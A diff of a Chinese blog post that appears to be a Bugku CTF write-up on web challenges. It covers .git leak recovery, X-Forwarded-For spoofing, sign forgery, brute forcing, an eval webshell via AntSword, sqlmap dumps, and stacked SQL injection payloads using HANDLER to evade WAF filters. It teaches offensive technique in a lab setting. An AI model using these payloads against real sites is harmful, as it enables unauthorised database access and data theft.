@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="12.29-1.4号 做了20题左右，仅记录了几道略难的题目。 source 查看源码，发现一个类似flag的内容，尝试了一下不对，\n用网页开发者工具查看cookie，也没有东西 尝试用目录扫描工具，dirsearch扫一下 发现有 .git 隐藏文件夹（它用来记录当前项目所有的版本历史，也能恢复代码到某次版本下）\n那怎么把这个 .git 文件夹弄到本地来呢\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" 12.29-1.4号 做了20题左右，仅记录了几道略难的题目。 source 查看源码，发现一个类似flag的内容，尝试了一下不对， 用网页开发者工具查看cookie，也没有东西 尝试用目录扫描工具，dirsearch扫一下 , 发现有 .git 隐藏文件夹（它用来记录当前项目所有的版本历史，也能恢复代码到某次版本下）\n那怎么把这个 .git 文件夹弄到本地来呢 这里我使用kali自带的wget命令， wget -r https://你的服务器网站地址/.git\n">
 <title>Bugku</title>
 
 <link rel='canonical' href='https://1noah11.github.io/lyeve.github.io/p/bugku/'>
 
 <link rel="stylesheet" href="/lyeve.github.io/scss/style.min.b0e76e98cdd4f7082d1fc36f7af7e0843a81201db2197c03ca426751dc923735.css"><meta property='og:title' content="Bugku">
-<meta property='og:description' content="12.29-1.4号 做了20题左右，仅记录了几道略难的题目。 source 查看源码，发现一个类似flag的内容，尝试了一下不对，\n用网页开发者工具查看cookie，也没有东西 尝试用目录扫描工具，dirsearch扫一下 发现有 .git 隐藏文件夹（它用来记录当前项目所有的版本历史，也能恢复代码到某次版本下）\n那怎么把这个 .git 文件夹弄到本地来呢\n">
+<meta property='og:description' content=" 12.29-1.4号 做了20题左右，仅记录了几道略难的题目。 source 查看源码，发现一个类似flag的内容，尝试了一下不对， 用网页开发者工具查看cookie，也没有东西 尝试用目录扫描工具，dirsearch扫一下 , 发现有 .git 隐藏文件夹（它用来记录当前项目所有的版本历史，也能恢复代码到某次版本下）\n那怎么把这个 .git 文件夹弄到本地来呢 这里我使用kali自带的wget命令， wget -r https://你的服务器网站地址/.git\n">
 <meta property='og:url' content='https://1noah11.github.io/lyeve.github.io/p/bugku/'>
 <meta property='og:site_name' content='MD-Web-lyeve'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-03T23:49:27&#43;08:00'/><meta property='article:modified_time' content='2026-01-03T23:49:27&#43;08:00'/>
 <meta name="twitter:title" content="Bugku">
-<meta name="twitter:description" content="12.29-1.4号 做了20题左右，仅记录了几道略难的题目。 source 查看源码，发现一个类似flag的内容，尝试了一下不对，\n用网页开发者工具查看cookie，也没有东西 尝试用目录扫描工具，dirsearch扫一下 发现有 .git 隐藏文件夹（它用来记录当前项目所有的版本历史，也能恢复代码到某次版本下）\n那怎么把这个 .git 文件夹弄到本地来呢\n">
+<meta name="twitter:description" content=" 12.29-1.4号 做了20题左右，仅记录了几道略难的题目。 source 查看源码，发现一个类似flag的内容，尝试了一下不对， 用网页开发者工具查看cookie，也没有东西 尝试用目录扫描工具，dirsearch扫一下 , 发现有 .git 隐藏文件夹（它用来记录当前项目所有的版本历史，也能恢复代码到某次版本下）\n那怎么把这个 .git 文件夹弄到本地来呢 这里我使用kali自带的wget命令， wget -r https://你的服务器网站地址/.git\n">
     </head>
     <body class="
     article-page
@@ -276,6 +276,26 @@
     <li><a href="#需要管理员">需要管理员</a></li>
     <li><a href="#速度要快">速度要快</a></li>
     <li><a href="#file_get_contents">file_get_contents</a></li>
+    <li><a href="#110-">1.10-</a>
+      <ol>
+        <li><a href="#成绩查询">成绩查询</a></li>
+        <li><a href="#no-selection">no selection</a>
+          <ol>
+            <li><a href="#小结">小结：</a></li>
+          </ol>
+        </li>
+        <li><a href="#login2">LOGIN2</a>
+          <ol>
+            <li><a href="#总结">总结</a></li>
+          </ol>
+        </li>
+        <li><a href="#very-easy-sql">very-easy-sql</a>
+          <ol>
+            <li><a href="#总结-1">总结：</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -333,8 +353,16 @@
     <section class="article-content">
     
     
-    <h1 id="1229-14号">12.29-1.4号
+    <style>
+  .article-post img { 
+      display: block !important; 
+      margin: 2rem auto !important; 
+      clear: both !important; 
+  }
+</style>
+<h1 id="1229-14号">12.29-1.4号
 </h1><p>做了20题左右，仅记录了几道略难的题目。
+<br><br>
 <img src="/lyeve.github.io/p/bugku/img0.png"
 	width="496"
 	height="906"
@@ -346,7 +374,8 @@
 		data-flex-grow="54"
 		data-flex-basis="131px"
 	
-></p>
+>
+<br></p>
 <h2 id="source">source
 </h2><p><img src="/lyeve.github.io/p/bugku/img1.png"
 	width="461"
@@ -359,10 +388,11 @@
 		data-flex-grow="250"
 		data-flex-basis="601px"
 	
->
-查看源码，发现一个类似flag的内容，尝试了一下不对，</p>
-<p>用网页开发者工具查看cookie，也没有东西
+></p>
+<p>查看源码，发现一个类似flag的内容，尝试了一下不对，
+用网页开发者工具查看cookie，也没有东西
 尝试用目录扫描工具，dirsearch扫一下
+<br> ,
 <img src="/lyeve.github.io/p/bugku/img2.png"
 	width="837"
 	height="750"
@@ -375,9 +405,10 @@
 		data-flex-basis="267px"
 	
 >
+<br>
 发现有 .git 隐藏文件夹（它用来记录当前项目所有的版本历史，也能恢复代码到某次版本下）<br>
-那怎么把这个 .git 文件夹弄到本地来呢</p>
-<p>这里我使用kali自带的wget命令，
+那怎么把这个 .git 文件夹弄到本地来呢
+这里我使用kali自带的wget命令，
 wget -r https://你的服务器网站地址/.git</p>
 <p><img src="/lyeve.github.io/p/bugku/img3.png"
 	width="655"
@@ -390,13 +421,13 @@ wget -r https://你的服务器网站地址/.git</p>
 		data-flex-grow="237"
 		data-flex-basis="569px"
 	
->
-发现一共有两次git提交
+></p>
+<p>发现一共有两次git提交
 一次是d256328
 一次是e0b8e8e
 回滚到d256328，发现flag.txt被删除了，但实际上只要 .git 文件夹还在，任何人都可以通过 git log和 git show 找回被删除的敏感文件
-使用ll命令查看后发现没有flag文件
-<img src="/lyeve.github.io/p/bugku/img4.png"
+使用ll命令查看后发现没有flag文件</p>
+<p><img src="/lyeve.github.io/p/bugku/img4.png"
 	width="624"
 	height="604"
 	srcset="/lyeve.github.io/p/bugku/img4_hu_905cc25a701102da.png 480w, /lyeve.github.io/p/bugku/img4_hu_85a7e65563f6cbb1.png 1024w"
@@ -407,9 +438,9 @@ wget -r https://你的服务器网站地址/.git</p>
 		data-flex-grow="103"
 		data-flex-basis="247px"
 	
->
-输入git show d25632查看改动情况
-<img src="/lyeve.github.io/p/bugku/img5.png"
+></p>
+<p>输入git show d25632查看改动情况</p>
+<p><img src="/lyeve.github.io/p/bugku/img5.png"
 	width="572"
 	height="255"
 	srcset="/lyeve.github.io/p/bugku/img5_hu_b2af5d400ec62e45.png 480w, /lyeve.github.io/p/bugku/img5_hu_9125801d9b33f738.png 1024w"
@@ -420,10 +451,10 @@ wget -r https://你的服务器网站地址/.git</p>
 		data-flex-grow="224"
 		data-flex-basis="538px"
 	
->
-发现这是一个假的flag</p>
-<p>使用git reflog
-<img src="/lyeve.github.io/p/bugku/img6.png"
+></p>
+<p>发现这是一个假的flag
+使用git reflog</p>
+<p><img src="/lyeve.github.io/p/bugku/img6.png"
 	width="616"
 	height="199"
 	srcset="/lyeve.github.io/p/bugku/img6_hu_e2ecb8d66d47e51e.png 480w, /lyeve.github.io/p/bugku/img6_hu_4eaa2868efc5c695.png 1024w"
@@ -437,8 +468,8 @@ wget -r https://你的服务器网站地址/.git</p>
 ></p>
 <p>发现还有很多历史版本，
 然后使用git show xxxx挨个扫
-发现果然flag藏在其中
-<img src="/lyeve.github.io/p/bugku/img8.png"
+发现果然flag藏在其中</p>
+<p><img src="/lyeve.github.io/p/bugku/img8.png"
 	width="528"
 	height="306"
 	srcset="/lyeve.github.io/p/bugku/img8_hu_1d27abf7c4e6bd4e.png 480w, /lyeve.github.io/p/bugku/img8_hu_e38855110c5a1b83.png 1024w"
@@ -451,8 +482,8 @@ wget -r https://你的服务器网站地址/.git</p>
 	
 ></p>
 <h2 id="本地管理员">本地管理员
-</h2><p>查看源码：
-<img src="/lyeve.github.io/p/bugku/img9.png"
+</h2><p>查看源码：</p>
+<p><img src="/lyeve.github.io/p/bugku/img9.png"
 	width="1723"
 	height="810"
 	srcset="/lyeve.github.io/p/bugku/img9_hu_169cfa500638457a.png 480w, /lyeve.github.io/p/bugku/img9_hu_3b284365eda5662b.png 1024w"
@@ -465,8 +496,8 @@ wget -r https://你的服务器网站地址/.git</p>
 	
 ></p>
 <p>发现一个编码，解码后是test123，不知道是密码还是账号
-试一下
-<img src="/lyeve.github.io/p/bugku/img10.png"
+试一下</p>
+<p><img src="/lyeve.github.io/p/bugku/img10.png"
 	width="440"
 	height="232"
 	srcset="/lyeve.github.io/p/bugku/img10_hu_e92fe10a44a3ee6.png 480w, /lyeve.github.io/p/bugku/img10_hu_678059edd2d6fd07.png 1024w"
@@ -477,10 +508,10 @@ wget -r https://你的服务器网站地址/.git</p>
 		data-flex-grow="189"
 		data-flex-basis="455px"
 	
->
-发现ip禁止访问，有提示是要本地管理员登录，所以尝试把ip改为127.0.0.1
-用bp抓包重放，添加X-Forwarded-For:127.0.0.1字段
-<img src="/lyeve.github.io/p/bugku/img11.png"
+></p>
+<p>发现ip禁止访问，有提示是要本地管理员登录，所以尝试把ip改为127.0.0.1
+用bp抓包重放，添加X-Forwarded-For:127.0.0.1字段</p>
+<p><img src="/lyeve.github.io/p/bugku/img11.png"
 	width="1583"
 	height="644"
 	srcset="/lyeve.github.io/p/bugku/img11_hu_e6a1374caadbff37.png 480w, /lyeve.github.io/p/bugku/img11_hu_5e0a2cc28d668a03.png 1024w"
@@ -491,9 +522,9 @@ wget -r https://你的服务器网站地址/.git</p>
 		data-flex-grow="245"
 		data-flex-basis="589px"
 	
->
-回显变了，说明ip是对的，要修改密码账号信息才可以，然后试了一下admin就成功了
-<img src="/lyeve.github.io/p/bugku/img12.png"
+></p>
+<p>回显变了，说明ip是对的，要修改密码账号信息才可以，然后试了一下admin就成功了</p>
+<p><img src="/lyeve.github.io/p/bugku/img12.png"
 	width="1673"
 	height="657"
 	srcset="/lyeve.github.io/p/bugku/img12_hu_411674c4ea8b3b72.png 480w, /lyeve.github.io/p/bugku/img12_hu_f04b8d6ca7d66dbb.png 1024w"
@@ -506,8 +537,8 @@ wget -r https://你的服务器网站地址/.git</p>
 	
 ></p>
 <h2 id="game1">game1
-</h2><p>猜测玩游戏得到一定分数就可以获得flag，抓包然后修改score为10000，不行。因为后面有个sign值，sign值的作用，进行签名，把数据做了加密后产生的，后台会把提交过去的数据做相同处理产生 sign 值和你发过去的 sign 值做判断，不一致则数据是被篡改了
-<img src="/lyeve.github.io/p/bugku/img13.png"
+</h2><p>猜测玩游戏得到一定分数就可以获得flag，抓包然后修改score为10000，不行。因为后面有个sign值，sign值的作用，进行签名，把数据做了加密后产生的，后台会把提交过去的数据做相同处理产生 sign 值和你发过去的 sign 值做判断，不一致则数据是被篡改了</p>
+<p><img src="/lyeve.github.io/p/bugku/img13.png"
 	width="1415"
 	height="563"
 	srcset="/lyeve.github.io/p/bugku/img13_hu_3a94b64e2b6d8582.png 480w, /lyeve.github.io/p/bugku/img13_hu_6f9107ba6badf8e6.png 1024w"
@@ -546,8 +577,8 @@ wget -r https://你的服务器网站地址/.git</p>
 ></p>
 <p>把生成的加密结果放入bp发现还是不行
 继续分析源码，发现有一个自定义的base.js，应该是自设的编码机制
-然后直接在浏览器控制台调用函数，解码后的内容复制到bp的sign
-<img src="/lyeve.github.io/p/bugku/img16.png"
+然后直接在浏览器控制台调用函数，解码后的内容复制到bp的sign</p>
+<p><img src="/lyeve.github.io/p/bugku/img16.png"
 	width="312"
 	height="134"
 	srcset="/lyeve.github.io/p/bugku/img16_hu_f7d674bbad79b6b7.png 480w, /lyeve.github.io/p/bugku/img16_hu_580073fea1be0f98.png 1024w"
@@ -570,12 +601,13 @@ wget -r https://你的服务器网站地址/.git</p>
 		data-flex-grow="386"
 		data-flex-basis="926px"
 	
->成功拿到flag
+></p>
+<p>成功拿到flag
 flag{42febc48bc0404dc97ad61dab97d7d6d}</p>
 <h1 id="15-19">1.5-1.9
 </h1><h2 id="bp">bp
-</h2><p>是一个登录界面，随便提交一个密码
-<img src="/lyeve.github.io/p/bugku/img18.png"
+</h2><p>是一个登录界面，随便提交一个密码</p>
+<p><img src="/lyeve.github.io/p/bugku/img18.png"
 	width="663"
 	height="318"
 	srcset="/lyeve.github.io/p/bugku/img18_hu_f966e50f072eb186.png 480w, /lyeve.github.io/p/bugku/img18_hu_3b9d591912883b0d.png 1024w"
@@ -587,8 +619,8 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}</p>
 		data-flex-basis="500px"
 	
 ></p>
-<p>然后跳转到check.php页面，查看源码
-<img src="/lyeve.github.io/p/bugku/img19.png"
+<p>然后跳转到check.php页面，查看源码</p>
+<p><img src="/lyeve.github.io/p/bugku/img19.png"
 	width="655"
 	height="574"
 	srcset="/lyeve.github.io/p/bugku/img19_hu_f301b0e5ce1e8452.png 480w, /lyeve.github.io/p/bugku/img19_hu_5564653b0fb525d3.png 1024w"
@@ -602,8 +634,8 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}</p>
 ></p>
 <p>发现要到success.php页面然后参数code正确才可以
 然后code不等于bugku10000时才可以，应该是密码正确了，经过check.php验证，会自动生成正确的code
-所以直接拿字典爆破，
-<img src="/lyeve.github.io/p/bugku/img20.png"
+所以直接拿字典爆破，</p>
+<p><img src="/lyeve.github.io/p/bugku/img20.png"
 	width="531"
 	height="155"
 	srcset="/lyeve.github.io/p/bugku/img20_hu_4a93908012822f9b.png 480w, /lyeve.github.io/p/bugku/img20_hu_90c8a2d7e93f9aa9.png 1024w"
@@ -614,9 +646,9 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}</p>
 		data-flex-grow="342"
 		data-flex-basis="822px"
 	
->
-发现长度全都一样
-<img src="/lyeve.github.io/p/bugku/img21.png"
+></p>
+<p>发现长度全都一样</p>
+<p><img src="/lyeve.github.io/p/bugku/img21.png"
 	width="723"
 	height="395"
 	srcset="/lyeve.github.io/p/bugku/img21_hu_e6f3d9bf42d6db83.png 480w, /lyeve.github.io/p/bugku/img21_hu_3c700ee4b228a3d5.png 1024w"
@@ -628,8 +660,8 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}</p>
 		data-flex-basis="439px"
 	
 ></p>
-<p>可以让 burp 筛选下字符里不包含 bugku10000
-<img src="/lyeve.github.io/p/bugku/img22.png"
+<p>可以让 burp 筛选下字符里不包含 bugku10000</p>
+<p><img src="/lyeve.github.io/p/bugku/img22.png"
 	width="546"
 	height="428"
 	srcset="/lyeve.github.io/p/bugku/img22_hu_b5cc872100b4d3f4.png 480w, /lyeve.github.io/p/bugku/img22_hu_fc68bda3b5c67ad2.png 1024w"
@@ -652,8 +684,8 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}</p>
 		data-flex-grow="222"
 		data-flex-basis="534px"
 	
->
-成功获取flag</p>
+></p>
+<p>成功获取flag</p>
 <p><img src="/lyeve.github.io/p/bugku/img24.png"
 	width="1111"
 	height="577"
@@ -667,8 +699,8 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}</p>
 	
 ></p>
 <h2 id="eval">eval
-</h2><p>查看源码：
-<img src="/lyeve.github.io/p/bugku/img25.png"
+</h2><p>查看源码：</p>
+<p><img src="/lyeve.github.io/p/bugku/img25.png"
 	width="417"
 	height="218"
 	srcset="/lyeve.github.io/p/bugku/img25_hu_566fcf45844a89b4.png 480w, /lyeve.github.io/p/bugku/img25_hu_ea1207596566965a.png 1024w"
@@ -692,10 +724,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}</p>
 		data-flex-grow="661"
 		data-flex-basis="1588px"
 	
->
-看到了flag变量，但值没有</p>
-<p>eval函数会执行字符串中的php代码,试一下
-<img src="/lyeve.github.io/p/bugku/img27.png"
+></p>
+<p>看到了flag变量，但值没有</p>
+<p>eval函数会执行字符串中的php代码,试一下</p>
+<p><img src="/lyeve.github.io/p/bugku/img27.png"
 	width="429"
 	height="199"
 	srcset="/lyeve.github.io/p/bugku/img27_hu_b398dfafcfabe48f.png 480w, /lyeve.github.io/p/bugku/img27_hu_b62ba8a188bab49a.png 1024w"
@@ -706,10 +738,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}</p>
 		data-flex-grow="215"
 		data-flex-basis="517px"
 	
->
-可以把传入的hello参数设置为一句话木马
-然后用蚁剑连接
-<img src="/lyeve.github.io/p/bugku/img28.png"
+></p>
+<p>可以把传入的hello参数设置为一句话木马
+然后用蚁剑连接</p>
+<p><img src="/lyeve.github.io/p/bugku/img28.png"
 	width="523"
 	height="386"
 	srcset="/lyeve.github.io/p/bugku/img28_hu_83cc03bbef5bd7c7.png 480w, /lyeve.github.io/p/bugku/img28_hu_85937ca4250a6de9.png 1024w"
@@ -720,16 +752,16 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}</p>
 		data-flex-grow="135"
 		data-flex-basis="325px"
 	
->
-连接成功后就可以看到flag.php文件，看到flag了
+></p>
+<p>连接成功后就可以看到flag.php文件，看到flag了
 ，忘记截图了。。</p>
 <h2 id="需要管理员">需要管理员
 </h2><p>打开题目发现是404界面，源码也没有有用的信息
 扫描一下发现有个robots.txt
 robots.txt 文件作用是
 避免爬虫抓取不必要的内容（如重复页面、后台页面），节省服务器带宽和资源。<br>
-引导搜索引擎更高效地抓取网站的重要内容，有助于优化 SEO（搜索引擎优化排名）
-<img src="/lyeve.github.io/p/bugku/img29.png"
+引导搜索引擎更高效地抓取网站的重要内容，有助于优化 SEO（搜索引擎优化排名）</p>
+<p><img src="/lyeve.github.io/p/bugku/img29.png"
 	width="892"
 	height="282"
 	srcset="/lyeve.github.io/p/bugku/img29_hu_f97b56449259bc98.png 480w, /lyeve.github.io/p/bugku/img29_hu_fe9c0708c08c09ad.png 1024w"
@@ -740,10 +772,10 @@ robots.txt 文件作用是
 		data-flex-grow="316"
 		data-flex-basis="759px"
 	
->
-查看后发现两行内容，第一行是解释对哪些类别的爬虫生效
-第二行是指定禁止爬虫抓取的路径。
-<img src="/lyeve.github.io/p/bugku/img30.png"
+></p>
+<p>查看后发现两行内容，第一行是解释对哪些类别的爬虫生效
+第二行是指定禁止爬虫抓取的路径。</p>
+<p><img src="/lyeve.github.io/p/bugku/img30.png"
 	width="452"
 	height="95"
 	srcset="/lyeve.github.io/p/bugku/img30_hu_306854a6caec77c1.png 480w, /lyeve.github.io/p/bugku/img30_hu_2221c72d35bed2d9.png 1024w"
@@ -755,8 +787,8 @@ robots.txt 文件作用是
 		data-flex-basis="1141px"
 	
 ></p>
-<p>我们查看一下resul1.php页面
-<img src="/lyeve.github.io/p/bugku/img31.png"
+<p>我们查看一下resul1.php页面</p>
+<p><img src="/lyeve.github.io/p/bugku/img31.png"
 	width="1255"
 	height="545"
 	srcset="/lyeve.github.io/p/bugku/img31_hu_c738c2871d87b21b.png 480w, /lyeve.github.io/p/bugku/img31_hu_64a86c1f982e3379.png 1024w"
@@ -769,8 +801,8 @@ robots.txt 文件作用是
 	
 ></p>
 <p>说要管理员身份
-结合他给的x参数
-<img src="/lyeve.github.io/p/bugku/img32.png"
+结合他给的x参数</p>
+<p><img src="/lyeve.github.io/p/bugku/img32.png"
 	width="1073"
 	height="524"
 	srcset="/lyeve.github.io/p/bugku/img32_hu_ec980c360889baa1.png 480w, /lyeve.github.io/p/bugku/img32_hu_9d57f9036936a9b3.png 1024w"
@@ -797,8 +829,8 @@ robots.txt 文件作用是
 	
 ></p>
 <p>然后继续找，看请求头，发现了疑似flag的值
-结尾是双等号  一看就是base64编码
-<img src="/lyeve.github.io/p/bugku/img34.png"
+结尾是双等号  一看就是base64编码</p>
+<p><img src="/lyeve.github.io/p/bugku/img34.png"
 	width="1814"
 	height="656"
 	srcset="/lyeve.github.io/p/bugku/img34_hu_ad25a78671d72e95.png 480w, /lyeve.github.io/p/bugku/img34_hu_a90e38fd33f57df7.png 1024w"
@@ -931,8 +963,8 @@ robots.txt 文件作用是
 </span></span><span class="line"><span class="cl">    solve()
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>运行后就得到了flag
-<img src="/lyeve.github.io/p/bugku/img35.png"
+</div><p>运行后就得到了flag</p>
+<p><img src="/lyeve.github.io/p/bugku/img35.png"
 	width="698"
 	height="203"
 	srcset="/lyeve.github.io/p/bugku/img35_hu_d13ebc662a376d6a.png 480w, /lyeve.github.io/p/bugku/img35_hu_bcd71d92c92d69ab.png 1024w"
@@ -982,8 +1014,8 @@ robots.txt 文件作用是
 </div>
 </div><p>extract();  这个函数会将 URL 参数（GET 请求）转化为变量名和变量值
 变量f是从fn文件中读取的内容，如果ac等于f，就输出flag
-下面关键就是区找flag文件了，用dirsearch扫发现了flag.txt
-<img src="/lyeve.github.io/p/bugku/img36.png"
+下面关键就是区找flag文件了，用dirsearch扫发现了flag.txt</p>
+<p><img src="/lyeve.github.io/p/bugku/img36.png"
 	width="461"
 	height="198"
 	srcset="/lyeve.github.io/p/bugku/img36_hu_abf4850ffa5ea986.png 480w, /lyeve.github.io/p/bugku/img36_hu_ed85f4a17a4df206.png 1024w"
@@ -995,8 +1027,8 @@ robots.txt 文件作用是
 		data-flex-basis="558px"
 	
 >
-打开flag.txt文件，只有bugku字段，fn就是flag.txt，ac就是bugku。
-<img src="/lyeve.github.io/p/bugku/img37.png"
+打开flag.txt文件，只有bugku字段，fn就是flag.txt，ac就是bugku。</p>
+<p><img src="/lyeve.github.io/p/bugku/img37.png"
 	width="596"
 	height="384"
 	srcset="/lyeve.github.io/p/bugku/img37_hu_4ba301ff392509c8.png 480w, /lyeve.github.io/p/bugku/img37_hu_9919c957a512a36f.png 1024w"
@@ -1008,6 +1040,766 @@ robots.txt 文件作用是
 		data-flex-basis="372px"
 	
 ></p>
+<h2 id="110-">1.10-
+</h2><h3 id="成绩查询">成绩查询
+</h3><p>是个sql注入
+发现是post类型的请求，然后发到burp，保存项目</p>
+<p><img src="/lyeve.github.io/p/bugku/img38.png"
+	width="1790"
+	height="563"
+	srcset="/lyeve.github.io/p/bugku/img38_hu_256b92f92b5a3ee1.png 480w, /lyeve.github.io/p/bugku/img38_hu_29c1d543d0c09a64.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="317"
+		data-flex-basis="763px"
+	
+></p>
+<p>保存到sqlmap目录下，命名为1.txt</p>
+<p><img src="/lyeve.github.io/p/bugku/img40.png"
+	width="923"
+	height="601"
+	srcset="/lyeve.github.io/p/bugku/img40_hu_4064c2b4c7414075.png 480w, /lyeve.github.io/p/bugku/img40_hu_17de77e5a2620334.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="153"
+		data-flex-basis="368px"
+	
+></p>
+<p>pyhton sqlmap.py -r 1.txt &ndash;dbs</p>
+<p><img src="/lyeve.github.io/p/bugku/img43.png"
+	width="822"
+	height="434"
+	srcset="/lyeve.github.io/p/bugku/img43_hu_d711593d8ec3dc95.png 480w, /lyeve.github.io/p/bugku/img43_hu_90f7e78951aad9b7.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="189"
+		data-flex-basis="454px"
+	
+></p>
+<p>获取数据库后再爆表：
+pyhton sqlmap.py -r 1.txt -D skctf  &ndash;tables</p>
+<p><img src="/lyeve.github.io/p/bugku/img42.png"
+	width="556"
+	height="242"
+	srcset="/lyeve.github.io/p/bugku/img42_hu_b99ccd921ffd146.png 480w, /lyeve.github.io/p/bugku/img42_hu_6d640c51d91367b6.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="229"
+		data-flex-basis="551px"
+	
+></p>
+<p>得到表再爆破数据
+pyhton sqlmap.py -r 1.txt -D skctf  -T fl4g &ndash;dump</p>
+<p><img src="/lyeve.github.io/p/bugku/img41.png"
+	width="984"
+	height="366"
+	srcset="/lyeve.github.io/p/bugku/img41_hu_59b767136f4fe1bb.png 480w, /lyeve.github.io/p/bugku/img41_hu_6523e6a5e2ed7b83.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="268"
+		data-flex-basis="645px"
+	
+></p>
+<h3 id="no-selection">no selection
+</h3><p>发现是一个get请求</p>
+<p><img src="/lyeve.github.io/p/bugku/img44.png"
+	width="1665"
+	height="412"
+	srcset="/lyeve.github.io/p/bugku/img44_hu_360cb46ac464002f.png 480w, /lyeve.github.io/p/bugku/img44_hu_1d277edf8a61a91c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="404"
+		data-flex-basis="969px"
+	
+></p>
+<p>直接用sqlmap爆破
+得到了flag数据库想继续爆破表</p>
+<p><img src="/lyeve.github.io/p/bugku/img46.png"
+	width="847"
+	height="374"
+	srcset="/lyeve.github.io/p/bugku/img46_hu_e85467a6081f0311.png 480w, /lyeve.github.io/p/bugku/img46_hu_1130dd6bb5ba02a6.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="226"
+		data-flex-basis="543px"
+	
+></p>
+<p>但是报错，无法的接收到表名</p>
+<p>手动注入尝试一下，拼接select database();  回显是no hacker！  应该是添加了过滤机制，过滤了一些常用函数，拼接SHOW DATABASE();&ndash;  读取到了所有的数据库，发现有flag，</p>
+<p><img src="/lyeve.github.io/p/bugku/img47.png"
+	width="321"
+	height="414"
+	srcset="/lyeve.github.io/p/bugku/img47_hu_67479726b3af3c6d.png 480w, /lyeve.github.io/p/bugku/img47_hu_86a0c60de64fda82.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="77"
+		data-flex-basis="186px"
+	
+>
+再查flag数据库中的表</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">任意字符&#39;;USE flag;SHOW TABLES;-- # USE 使用数据库，SHOW TABLES 查看所有表
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现还有个flag表
+刚才用select函数不行，这里采用的是handler 函数 ，</p>
+<ol>
+<li>HANDLER 表名 OPEN； （大小写 SQL 里的关键字都可以，意思是打开指定表名）</li>
+<li>HANDLER 表名 READ NEXT; （读取表中下一行-第一次读取的是第一行）</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">任意字符&#39;;HANDLER flag OPEN; HANDLER flag READ NEXT;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有回显，果然可以用。继续读下一行就需要多加一行命令HANDLER flag READ NEXT;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">任意字符&#39;;HANDLER flag OPEN; HANDLER flag READ NEXT;HANDLER flag READ NEXT;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>以此类推</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">任意字符&#39;;HANDLER flag OPEN; HANDLER flag READ NEXT;HANDLER flag READ NEXT;HANDLER flag READ NEXT;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>大概读了七次</p>
+<p><img src="/lyeve.github.io/p/bugku/img48.png"
+	width="439"
+	height="865"
+	srcset="/lyeve.github.io/p/bugku/img48_hu_40abbc9ac06d9fe5.png 480w, /lyeve.github.io/p/bugku/img48_hu_93a60237bf6675e6.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="50"
+		data-flex-basis="121px"
+	
+></p>
+<h4 id="小结">小结：
+</h4><p>除了要掌握sqlmap的爆破注入外，还要注重基础的手工注入</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th><strong>特性</strong></th>
+          <th><strong>SELECT</strong></th>
+          <th><strong>HANDLER</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>标准性</strong></td>
+          <td>SQL 标准，支持所有主流数据库。</td>
+          <td><strong>MySQL/MariaDB 特有</strong>，非标准 SQL。</td>
+      </tr>
+      <tr>
+          <td><strong>执行过程</strong></td>
+          <td>经过解析、优化，性能较高但流程复杂。</td>
+          <td><strong>直接访问</strong>存储引擎，绕过优化器。</td>
+      </tr>
+      <tr>
+          <td><strong>隐蔽性</strong></td>
+          <td><strong>低</strong>。极易被 WAF 识别和拦截。</td>
+          <td><strong>高</strong>。作为冷门语法，常被防火墙规则忽略。</td>
+      </tr>
+      <tr>
+          <td><strong>功能丰富度</strong></td>
+          <td><strong>强</strong>。支持 Join、Group By、聚合函数等。</td>
+          <td><strong>弱</strong>。只能一行行读，不支持复杂的逻辑运算。</td>
+      </tr>
+      <tr>
+          <td><strong>语法结构</strong></td>
